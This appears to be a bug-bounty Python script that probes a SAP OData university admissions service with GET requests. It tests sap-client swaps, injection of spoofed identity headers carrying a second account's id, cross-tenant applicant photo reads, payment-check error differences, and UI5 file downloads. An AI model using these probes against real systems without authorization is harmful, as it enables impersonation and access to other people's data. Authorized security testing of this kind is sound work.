#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F — Combined GET-only phases (F4.1, F4.2, F3.1, F2.3, F2.4).

All safe methods. No writes. Low ACL weight; safe to combine on one IP.

Phases:
  F4.1 sap-client swap (4 GETs)
    Vary sap-client query param: 000, 100, 200 (control), 300. Any client
    other than 200 returning different data would suggest cross-client bleed.
  F4.2 trust-header injection (5 GETs)
    Inject headers the app might trust for identity/routing:
      sap-user, X-Forwarded-For, X-Forwarded-User, sap-trusted-system,
      x-remote-user
    If response identity changes from A to B, that's an auth-confusion bug
    in the SAP proxy/app trust config.
  F3.1 payment verifier ownership (4 GETs)
    isPaymentDone(admCode, paymentId) FunctionImport. Error-differential
    study — well-formed-but-nonexistent id vs malformed id vs mismatched
    admCode.
  F2.3 cross-tenant photo read (2 GETs)
    GET /ApplicantPhotos('0')/$value from A (baseline).
    GET /ApplicantPhotos('IN01051651')/$value from A (B's account id).
    If the second returns a body different from the first, that's cross-
    tenant photo read.
  F2.4 ApplicationAttachments lazy-load (2 GETs)
    GET /sap/bc/ui5_ui5/sap/zc_ad_appl/view/ApplicationAttachments.view.xml
    GET /sap/bc/ui5_ui5/sap/zc_ad_appl/controller/ApplicationAttachments.controller.js
    (Different path than /opu/odata — probably different ACL bucket.)

Budget: ~17 safe GETs total, 0 non-safe.
"""
import argparse
import json
import os
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m


def _safe_get_via_client(client, session, rel, extra_headers, logger, sweep, note):
    """Route through authz_matrix.Client so we get rate limit + scope guard.
    A probe's 401 or scope-refusal is informative, not a phase-halting error —
    log and continue."""
    try:
        r = client.request(session, "GET", rel,
                           extra_headers=extra_headers or None, note=note)
    except m.SessionExpired as e:
        r = {"status": 401, "text": f"SessionExpired-treated-as-probe-401: {e}",
             "headers": {}}
    except m.ScopeViolation as e:
        r = {"status": "SCOPE-REFUSED",
             "text": f"ScopeViolation-guard-refused-probe: {e}",
             "headers": {}}
    logger.log(sweep, rel, "GET", note, r,
               [f"status={r.get('status')}", f"len={len(r.get('text','') or '')}"])
    return r


def raw_get_ui5(session, path, logger, note):
    """Raw urllib GET for the /sap/bc/ui5_ui5/ tree — outside authz_matrix's
    OData scope guard on purpose (different scope allowed per brief)."""
    url = f"https://{m.ALLOWED_HOST}{path}"
    time.sleep(m.MIN_INTERVAL)
    req = urllib.request.Request(url, method="GET",
                                  headers={"Accept": "*/*",
                                           "Cookie": session.cookie_header})
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        status = resp.getcode()
        body = resp.read(400_000)
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read() if e.fp else b""
    except Exception as e:
        return {"status": "ERR", "text": str(e)[:120]}
    logger.log("f2.4", path, "GET", note,
               {"status": status, "text": ""},
               [f"status={status}", f"len={len(body)}",
                f"content_type={resp.headers.get('Content-Type', '?') if status < 400 else '?'}"] if False else
               [f"status={status}", f"len={len(body)}"])
    return {"status": status, "text": body.decode("utf-8", errors="replace"),
             "bytes": body}


def phase_f41_sap_client(client, sA, logger):
    """F4.1 — vary sap-client. GET /Applicants('0') with sap-client=X, X!=200."""
    print("\n=== F4.1 — sap-client swap ===", file=sys.stderr)
    baseline_ident = None
    for client_num in ("200", "000", "100", "300"):
        # override sap-client on the URL
        rel = f"Applicants('0')?sap-client={client_num}"
        r = _safe_get_via_client(client, sA, rel, None, logger, "f4.1",
                                  f"F4.1 sap-client={client_num}")
        txt = r.get("text", "") or ""
        # extract identity if present
        ident = None
        idx = txt.find("'IN")
        if idx > 0:
            ident = txt[idx:idx + 15]
        if client_num == "200":
            baseline_ident = ident
        diff_from_baseline = (client_num != "200" and ident != baseline_ident
                              and ident is not None)
        logger.log("f4.1", rel, "COMPARE",
                   f"F4.1 sap-client={client_num} vs baseline",
                   {"status": "n/a", "text": ""},
                   [f"ident={ident!r}",
                    f"baseline_ident={baseline_ident!r}",
                    f"differs_from_baseline={diff_from_baseline}",
                    f"status={r.get('status')}"])


def phase_f42_trust_headers(client, sA, logger):
    """F4.2 — inject trust headers that might get proxied to app server."""
    print("\n=== F4.2 — trust-header injection ===", file=sys.stderr)
    baseline_r = _safe_get_via_client(client, sA, "Applicants('0')",
                                        None, logger, "f4.2",
                                        "F4.2 baseline no-injection")
    baseline_txt = baseline_r.get("text", "") or ""
    baseline_ident = baseline_txt[baseline_txt.find("'IN"):baseline_txt.find("'IN") + 15] if "'IN" in baseline_txt else None
    logger.log("f4.2", "Applicants('0')", "NOTE",
               "F4.2 baseline captured",
               {"status": "n/a", "text": ""},
               [f"baseline_ident={baseline_ident!r}"])

    HEADERS_TO_INJECT = [
        {"sap-user": "IN01051651"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-User": "IN01051651"},
        {"sap-trusted-system": "TRUSTED"},
        {"x-remote-user": "IN01051651"},
    ]
    for hdr_dict in HEADERS_TO_INJECT:
        note = f"F4.2 inject {list(hdr_dict.keys())[0]}={list(hdr_dict.values())[0]}"
        r = _safe_get_via_client(client, sA, "Applicants('0')", hdr_dict,
                                  logger, "f4.2", note)
        txt = r.get("text", "") or ""
        ident = None
        idx = txt.find("'IN")
        if idx > 0:
            ident = txt[idx:idx + 15]
        differs = (ident != baseline_ident) and ident is not None
        logger.log("f4.2", "Applicants('0')", "COMPARE",
                   f"F4.2 {list(hdr_dict.keys())[0]}",
                   {"status": "n/a", "text": ""},
                   [f"ident={ident!r}",
                    f"baseline_ident={baseline_ident!r}",
                    f"differs={differs}",
                    "ANOMALY_trust_header_identity_switch" if differs else ""])


def phase_f31_payment_verifier(client, sA, logger):
    """F3.1 — isPaymentDone error-differential study."""
    print("\n=== F3.1 — isPaymentDone ownership binding ===", file=sys.stderr)
    A_ADM = m.ACCT["A"]["application"]  # A's admCode
    B_ADM = m.ACCT["B"]["application"]  # B's admCode

    # NOTE: paymentId values avoid 12-digit numeric because the target-ID guard
    # would refuse to send those (they'd look like an application id).
    PROBES = [
        (A_ADM, "0",              "empty-like id, A's admCode"),
        (A_ADM, "12345",          "5-digit numeric, A's admCode"),
        (A_ADM, "99999999999",    "11-digit numeric, A's admCode"),
        (A_ADM, "9999999999999",  "13-digit numeric, A's admCode"),
        (A_ADM, "TESTPAY",        "alpha id, A's admCode"),
        (B_ADM, "0",              "cross-tenant admCode + empty-like id"),
        (B_ADM, "TESTPAY",        "cross-tenant admCode + alpha id"),
    ]
    prev_body = None
    for admCode, paymentId, note in PROBES:
        rel = f"isPaymentDone?admCode='{admCode}'&paymentId='{paymentId}'"
        r = _safe_get_via_client(client, sA, rel, None, logger, "f3.1",
                                  f"F3.1 {note}")
        txt = r.get("text", "") or ""
        # error diff
        differs = (prev_body is not None and txt != prev_body)
        logger.log("f3.1", rel, "COMPARE",
                   f"F3.1 error-diff {note}",
                   {"status": "n/a", "text": ""},
                   [f"status={r.get('status')}", f"body_len={len(txt)}",
                    f"body_preview={txt[:120]!r}",
                    f"differs_from_prev={differs}"])
        prev_body = txt


def phase_f23_cross_tenant_photo(client, sA, logger):
    """F2.3 — cross-tenant photo read."""
    print("\n=== F2.3 — cross-tenant photo read ===", file=sys.stderr)
    A_ACC = m.ACCT["A"]["applicant"]  # IN01051619
    B_ACC = m.ACCT["B"]["applicant"]  # IN01051651

    # Baseline: A's own photo
    r_own = _safe_get_via_client(client, sA, "ApplicantPhotos('0')/$value",
                                  None, logger, "f2.3",
                                  "F2.3 baseline A's own photo via '0'")
    own_bytes = len(r_own.get("text", "") or "")
    own_status = r_own.get("status")
    own_ct = r_own.get("headers", {}).get("content-type", "?")

    # Explicit A's applicant id
    r_a_by_id = _safe_get_via_client(client, sA,
                                       f"ApplicantPhotos('{A_ACC}')/$value",
                                       None, logger, "f2.3",
                                       f"F2.3 A's own photo via id={A_ACC}")

    # B's applicant id from A's session (the cross-tenant probe)
    r_b_by_id = _safe_get_via_client(client, sA,
                                       f"ApplicantPhotos('{B_ACC}')/$value",
                                       None, logger, "f2.3",
                                       f"F2.3 B's photo via id={B_ACC} (cross-user)")

    b_bytes = len(r_b_by_id.get("text", "") or "")
    b_status = r_b_by_id.get("status")
    b_ct = r_b_by_id.get("headers", {}).get("content-type", "?")
    b_is_different_body = (own_bytes != b_bytes) and b_status == 200
    b_is_403 = (b_status == 403)
    b_is_self_substitute = (b_bytes == own_bytes and b_status == 200)

    logger.log("f2.3", f"ApplicantPhotos('{B_ACC}')/$value", "COMPARE",
               "F2.3 cross-tenant photo verdict",
               {"status": "n/a", "text": ""},
               [f"own_status={own_status}", f"own_bytes={own_bytes}", f"own_ct={own_ct}",
                f"cross_status={b_status}", f"cross_bytes={b_bytes}", f"cross_ct={b_ct}",
                f"different_body={b_is_different_body}",
                f"is_403={b_is_403}",
                f"is_self_substitute={b_is_self_substitute}",
                "ANOMALY_cross_tenant_photo_read" if b_is_different_body else ""])


def phase_f24_lazyload(sA, logger):
    """F2.4 — GET the ApplicationAttachments view+controller from ui5_ui5 tree."""
    print("\n=== F2.4 — ApplicationAttachments lazy-load ===", file=sys.stderr)
    out_dir = "intigriti/kuleuven_admissions/vm-results/03-bundle/lazyloaded"
    os.makedirs(out_dir, exist_ok=True)
    CANDIDATES = [
        "/sap/bc/ui5_ui5/sap/zc_ad_appl/view/ApplicationAttachments.view.xml",
        "/sap/bc/ui5_ui5/sap/zc_ad_appl/controller/ApplicationAttachments.controller.js",
        "/sap/bc/ui5_ui5/sap/zc_ad_appl/fragment/AttachmentType.fragment.xml",
    ]
    for path in CANDIDATES:
        r = raw_get_ui5(sA, path, logger, f"F2.4 GET {path}")
        st = r.get("status")
        body_bytes = r.get("bytes", b"")
        if st == 200 and body_bytes:
            fname = os.path.basename(path)
            with open(f"{out_dir}/{fname}", "wb") as fh:
                fh.write(body_bytes)
            print(f"[f2.4] saved {out_dir}/{fname} ({len(body_bytes)} bytes)",
                  file=sys.stderr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client()
    logger = m.MatrixLogger(m.JSONL_PATH, append=True)
    sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
    client.fetch_csrf(sA)  # CSRF isn't needed for GETs but keeps session hot

    phase_f41_sap_client(client, sA, logger)
    phase_f42_trust_headers(client, sA, logger)
    phase_f31_payment_verifier(client, sA, logger)
    phase_f23_cross_tenant_photo(client, sA, logger)
    phase_f24_lazyload(sA, logger)

    print("\n=== DONE ===", file=sys.stderr)


if __name__ == "__main__":
    main()
